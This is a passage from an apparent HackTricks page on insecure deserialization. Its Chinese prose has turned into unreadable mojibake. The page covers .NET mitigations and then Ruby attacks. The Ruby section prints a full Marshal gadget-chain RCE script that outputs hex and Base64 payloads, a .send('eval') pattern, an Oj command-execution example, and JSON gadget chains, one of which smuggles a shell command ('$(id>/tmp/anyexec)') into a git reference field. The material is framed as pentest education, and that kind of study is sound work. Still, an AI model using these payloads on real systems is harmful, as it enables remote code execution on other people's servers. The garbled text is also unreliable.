<p>ä¸ºäº†å‡è½»ä¸ .Net ä¸­ååºåˆ—åŒ–ç›¸å…³çš„é£é™©ï¼š</p>
<ul>
<li><strong>é¿å…å…è®¸æ•°æ®æµå®šä¹‰å…¶å¯¹è±¡ç±»å‹ã€‚</strong> å°½å¯èƒ½ä½¿ç”¨ <code>DataContractSerializer</code> æˆ– <code>XmlSerializer</code>ã€‚</li>
<li><strong>å¯¹äº <code>JSON.Net</code>ï¼Œå°† <code>TypeNameHandling</code> è®¾ç½®ä¸º <code>None</code>ï¼š</strong> %%%TypeNameHandling = TypeNameHandling.None%%%</li>
<li><strong>é¿å…ä½¿ç”¨å¸¦æœ‰ <code>JavaScriptTypeResolver</code> çš„ <code>JavaScriptSerializer</code>ã€‚</strong></li>
<li><strong>é™åˆ¶å¯ä»¥è¢«ååºåˆ—åŒ–çš„ç±»å‹ï¼Œ</strong> ç†è§£ .Net ç±»å‹çš„å›ºæœ‰é£é™©ï¼Œä¾‹å¦‚ <code>System.IO.FileInfo</code>ï¼Œå®ƒå¯ä»¥ä¿®æ”¹æœåŠ¡å™¨æ–‡ä»¶çš„å±æ€§ï¼Œå¯èƒ½å¯¼è‡´æ‹’ç»æœåŠ¡æ”»å‡»ã€‚</li>
<li><strong>å¯¹å…·æœ‰é£é™©å±æ€§çš„ç±»å‹ä¿æŒè°¨æ…ï¼Œ</strong> å¦‚ <code>System.ComponentModel.DataAnnotations.ValidationException</code> åŠå…¶ <code>Value</code> å±æ€§ï¼Œå¯èƒ½ä¼šè¢«åˆ©ç”¨ã€‚</li>
<li><strong>å®‰å…¨åœ°æ§åˆ¶ç±»å‹å®ä¾‹åŒ–ï¼Œ</strong> ä»¥é˜²æ­¢æ”»å‡»è€…å½±å“ååºåˆ—åŒ–è¿‡ç¨‹ï¼Œä½¿å¾—å³ä½¿æ˜¯ <code>DataContractSerializer</code> æˆ– <code>XmlSerializer</code> ä¹Ÿå˜å¾—è„†å¼±ã€‚</li>
<li><strong>ä½¿ç”¨è‡ªå®šä¹‰ <code>SerializationBinder</code> å®ç°ç™½åå•æ§åˆ¶</strong>ï¼Œé€‚ç”¨äº <code>BinaryFormatter</code> å’Œ <code>JSON.Net</code>ã€‚</li>
<li><strong>ä¿æŒå¯¹å·²çŸ¥ä¸å®‰å…¨ååºåˆ—åŒ–å·¥å…·çš„äº†è§£ï¼Œ</strong> ç¡®ä¿ååºåˆ—åŒ–å™¨ä¸å®ä¾‹åŒ–æ­¤ç±»ç±»å‹ã€‚</li>
<li><strong>å°†æ½œåœ¨é£é™©ä»£ç ä¸å…·æœ‰äº’è”ç½‘è®¿é—®æƒé™çš„ä»£ç éš”ç¦»ï¼Œ</strong> ä»¥é¿å…å°†å·²çŸ¥å·¥å…·æš´éœ²ç»™ä¸å¯ä¿¡çš„æ•°æ®æºï¼Œä¾‹å¦‚ WPF åº”ç”¨ç¨‹åºä¸­çš„ <code>System.Windows.Data.ObjectDataProvider</code>ã€‚</li>
</ul>
<h3 id="references"><a class="header" href="#references"><strong>References</strong></a></h3>
<ul>
<li>Java å’Œ .Net JSON ååºåˆ—åŒ–<strong>è®ºæ–‡ï¼š</strong> <a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf"><strong>https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf</strong></a><strong>ï¼Œ</strong> æ¼”è®²ï¼š<a href="https://www.youtube.com/watch?v=oUAeWhW5b8c">https://www.youtube.com/watch?v=oUAeWhW5b8c</a> å’Œå¹»ç¯ç‰‡ï¼š<a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf">https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html#net-csharp">https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html#net-csharp</a></li>
<li><a href="https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf">https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf</a></li>
<li><a href="https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization">https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization</a></li>
</ul>
<h2 id="ruby"><a class="header" href="#ruby"><strong>Ruby</strong></a></h2>
<p>åœ¨ Ruby ä¸­ï¼Œåºåˆ—åŒ–é€šè¿‡ <strong>marshal</strong> åº“ä¸­çš„ä¸¤ä¸ªæ–¹æ³•æ¥å®ç°ã€‚ç¬¬ä¸€ä¸ªæ–¹æ³•ç§°ä¸º <strong>dump</strong>ï¼Œç”¨äºå°†å¯¹è±¡è½¬æ¢ä¸ºå­—èŠ‚æµã€‚è¿™ä¸ªè¿‡ç¨‹ç§°ä¸ºåºåˆ—åŒ–ã€‚ç›¸åï¼Œç¬¬äºŒä¸ªæ–¹æ³• <strong>load</strong> ç”¨äºå°†å­—èŠ‚æµè¿˜åŸä¸ºå¯¹è±¡ï¼Œè¿™ä¸ªè¿‡ç¨‹ç§°ä¸ºååºåˆ—åŒ–ã€‚</p>
<p>ä¸ºäº†ä¿æŠ¤åºåˆ—åŒ–å¯¹è±¡ï¼Œ<strong>Ruby ä½¿ç”¨ HMACï¼ˆåŸºäºå“ˆå¸Œçš„æ¶ˆæ¯è®¤è¯ç ï¼‰</strong>ï¼Œç¡®ä¿æ•°æ®çš„å®Œæ•´æ€§å’ŒçœŸå®æ€§ã€‚ç”¨äºæ­¤ç›®çš„çš„å¯†é’¥å­˜å‚¨åœ¨å‡ ä¸ªå¯èƒ½çš„ä½ç½®ä¹‹ä¸€ï¼š</p>
<ul>
<li><code>config/environment.rb</code></li>
<li><code>config/initializers/secret_token.rb</code></li>
<li><code>config/secrets.yml</code></li>
<li><code>/proc/self/environ</code></li>
</ul>
<p><strong>Ruby 2.X é€šç”¨ååºåˆ—åŒ–åˆ° RCE gadget é“¾ï¼ˆæ›´å¤šä¿¡æ¯è§</strong> <a href="https://www.elttam.com/blog/ruby-deserialization/"><strong>https://www.elttam.com/blog/ruby-deserialization/</strong></a><strong>ï¼‰ï¼š</strong></p>
<pre><code class="language-ruby">#!/usr/bin/env ruby

# Code from https://www.elttam.com/blog/ruby-deserialization/

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1&gt;&amp;2")#RCE cmd must start with "|" and end with "1&gt;&amp;2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file &lt;=&gt; other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
[$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
</code></pre>
<p>å…¶ä»– RCE é“¾ä»¥åˆ©ç”¨ Ruby On Rails: <a href="https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/">https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/</a></p>
<h3 id="ruby-send-æ–¹æ³•"><a class="header" href="#ruby-send-æ–¹æ³•">Ruby .send() æ–¹æ³•</a></h3>
<p>æ­£å¦‚åœ¨ <a href="https://starlabs.sg/blog/2024/04-sending-myself-github-com-environment-variables-and-ghes-shell/"><strong>è¿™ä¸ªæ¼æ´æŠ¥å‘Š</strong></a> ä¸­æ‰€è§£é‡Šçš„ï¼Œå¦‚æœæŸä¸ªç”¨æˆ·æœªç»è¿‡æ»¤çš„è¾“å…¥åˆ°è¾¾ ruby å¯¹è±¡çš„ <code>.send()</code> æ–¹æ³•ï¼Œè¯¥æ–¹æ³•å…è®¸ <strong>è°ƒç”¨å¯¹è±¡çš„ä»»ä½•å…¶ä»–æ–¹æ³•</strong>ï¼Œå¹¶ä¼ é€’ä»»ä½•å‚æ•°ã€‚</p>
<p>ä¾‹å¦‚ï¼Œè°ƒç”¨ eval å¹¶å°† ruby ä»£ç ä½œä¸ºç¬¬äºŒä¸ªå‚æ•°å°†å…è®¸æ‰§è¡Œä»»æ„ä»£ç ï¼š</p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-ruby">&lt;Object&gt;.send('eval', '&lt;user input with Ruby code&gt;') == RCE
</code></pre>
<p>{% endcode %}</p>
<p>æ­¤å¤–ï¼Œå¦‚æœåªæœ‰ä¸€ä¸ªå‚æ•°è¢«æ”»å‡»è€…æ§åˆ¶ï¼Œå¦‚å‰é¢çš„å†™ä½œä¸­æåˆ°çš„ï¼Œå¯ä»¥è°ƒç”¨å¯¹è±¡çš„ä»»ä½•<strong>ä¸éœ€è¦å‚æ•°</strong>æˆ–å…¶å‚æ•°å…·æœ‰<strong>é»˜è®¤å€¼</strong>çš„æ–¹æ³•ã€‚<br />
ä¸ºæ­¤ï¼Œå¯ä»¥æšä¸¾å¯¹è±¡çš„æ‰€æœ‰æ–¹æ³•ï¼Œä»¥<strong>æ‰¾åˆ°æ»¡è¶³è¿™äº›è¦æ±‚çš„ä¸€äº›æœ‰è¶£æ–¹æ³•</strong>ã€‚</p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-ruby">&lt;Object&gt;.send('&lt;user_input&gt;')

# This code is taken from the original blog post
# &lt;Object&gt; in this case is Repository
## Find methods with those requirements
repo = Repository.find(1)  # get first repo
repo_methods = [           # get names of all methods accessible by Repository object
repo.public_methods(),
repo.private_methods(),
repo.protected_methods(),
].flatten()

repo_methods.length()      # Initial number of methods =&gt; 5542

## Filter by the arguments requirements
candidate_methods = repo_methods.select() do |method_name|
[0, -1].include?(repo.method(method_name).arity())
end
candidate_methods.length() # Final number of methods=&gt; 3595
</code></pre>
<p>{% endcode %}</p>
<h3 id="å…¶ä»–åº“"><a class="header" href="#å…¶ä»–åº“">å…¶ä»–åº“</a></h3>
<p>æ­¤æŠ€æœ¯å–è‡ª<a href="https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/?utm_source=pocket_shared"> <strong>è¿™ç¯‡åšå®¢æ–‡ç« </strong></a>ã€‚</p>
<p>è¿˜æœ‰å…¶ä»– Ruby åº“å¯ä»¥ç”¨æ¥åºåˆ—åŒ–å¯¹è±¡ï¼Œå› æ­¤å¯ä»¥è¢«æ»¥ç”¨ä»¥åœ¨ä¸å®‰å…¨çš„ååºåˆ—åŒ–è¿‡ç¨‹ä¸­è·å¾— RCEã€‚ä»¥ä¸‹è¡¨æ ¼æ˜¾ç¤ºäº†ä¸€äº›è¿™äº›åº“åŠå…¶åœ¨ååºåˆ—åŒ–æ—¶è°ƒç”¨çš„åŠ è½½åº“çš„æ–¹æ³•ï¼ˆåŸºæœ¬ä¸Šæ˜¯æ»¥ç”¨ä»¥è·å¾— RCE çš„å‡½æ•°ï¼‰ï¼š</p>
<table data-header-hidden><thead><tr><th width="179"></th><th width="146"></th><th></th></tr></thead><tbody><tr><td><strong>åº“</strong></td><td><strong>è¾“å…¥æ•°æ®</strong></td><td><strong>ç±»å†…éƒ¨å¯åŠ¨æ–¹æ³•</strong></td></tr><tr><td>Marshal (Ruby)</td><td>äºŒè¿›åˆ¶</td><td><code>_load</code></td></tr><tr><td>Oj</td><td>JSON</td><td><code>hash</code>ï¼ˆç±»éœ€è¦ä½œä¸ºé”®æ”¾å…¥ hash(map) ä¸­ï¼‰</td></tr><tr><td>Ox</td><td>XML</td><td><code>hash</code>ï¼ˆç±»éœ€è¦ä½œä¸ºé”®æ”¾å…¥ hash(map) ä¸­ï¼‰</td></tr><tr><td>Psych (Ruby)</td><td>YAML</td><td><code>hash</code>ï¼ˆç±»éœ€è¦ä½œä¸ºé”®æ”¾å…¥ hash(map) ä¸­ï¼‰<br><code>init_with</code></td></tr><tr><td>JSON (Ruby)</td><td>JSON</td><td><code>json_create</code>ï¼ˆ[è¯·å‚é˜…å…³äº json_create çš„æ³¨é‡Š](#table-vulnerable-sinks)ï¼‰</td></tr></tbody></table>
<p>åŸºæœ¬ç¤ºä¾‹ï¼š</p>
<pre><code class="language-ruby"># Existing Ruby class inside the code of the app
class SimpleClass
def initialize(cmd)
@cmd = cmd
end

def hash
system(@cmd)
end
end

# Exploit
require 'oj'
simple = SimpleClass.new("open -a calculator") # command for macOS
json_payload = Oj.dump(simple)
puts json_payload

# Sink vulnerable inside the code accepting user input as json_payload
Oj.load(json_payload)
</code></pre>
<p>åœ¨å°è¯•æ»¥ç”¨ Oj çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥æ‰¾åˆ°ä¸€ä¸ªå°å·¥å…·ç±»ï¼Œå®ƒåœ¨å…¶ <code>hash</code> å‡½æ•°å†…éƒ¨ä¼šè°ƒç”¨ <code>to_s</code>ï¼Œç„¶åè°ƒç”¨ specï¼Œæ¥ç€è°ƒç”¨ fetch_pathï¼Œè¿™ä½¿å¾—å®ƒèƒ½å¤Ÿè·å–ä¸€ä¸ªéšæœº URLï¼Œä»è€Œå¾ˆå¥½åœ°æ£€æµ‹è¿™äº›æœªæ¸…ç†çš„ååºåˆ—åŒ–æ¼æ´ã€‚</p>
<pre><code class="language-json">{
"^o": "URI::HTTP",
"scheme": "s3",
"host": "example.org/anyurl?",
"port": "anyport","path": "/", "user": "anyuser", "password": "anypw"
}
</code></pre>
<p>æ­¤å¤–ï¼Œå‘ç°ä½¿ç”¨ä¹‹å‰çš„æŠ€æœ¯åœ¨ç³»ç»Ÿä¸­è¿˜ä¼šåˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œè¿™æ˜¯æ»¥ç”¨å¦ä¸€ä¸ªå°å·¥å…·çš„è¦æ±‚ï¼Œä»¥ä¾¿å°†å…¶è½¬å˜ä¸ºå®Œæ•´çš„ RCEï¼Œç±»ä¼¼äºï¼š</p>
<pre><code class="language-json">{
"^o": "Gem::Resolver::SpecSpecification",
"spec": {
"^o": "Gem::Resolver::GitSpecification",
"source": {
"^o": "Gem::Source::Git",
"git": "zip",
"reference": "-TmTT=\"$(id&gt;/tmp/anyexec)\"",
"root_dir": "/tmp",
"repository": "anyrepo",
"name": "anyname"
},
"spec": {
"^o": "Gem::Resolver::Specification",
"name": "name",
"dependencies": []
}
}
}
</code></pre>
<p>æ£€æŸ¥æ›´å¤šç»†èŠ‚è¯·æŸ¥çœ‹<a href="https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/?utm_source=pocket_shared"><strong>åŸå§‹å¸–å­</strong></a>ã€‚</p>
<p>{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS Hackingï¼š<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ å’Œå®è·µ GCP Hackingï¼š<img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹<a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>telegram ç¾¤ç»„</strong></a> æˆ– <strong>åœ¨</strong> <strong>Twitter</strong> ğŸ¦ <strong>ä¸Šå…³æ³¨æˆ‘ä»¬</strong> <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../pentesting-web/dependency-confusion.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/index.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../pentesting-web/dependency-confusion.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/index.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../elasticlunr.min.js"></script>
        <script src="../../mark.min.js"></script>
        <script src="../../searcher.js"></script>

        <script src="../../clipboard.min.js"></script>
        <script src="../../highlight.js"></script>
        <script src="../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
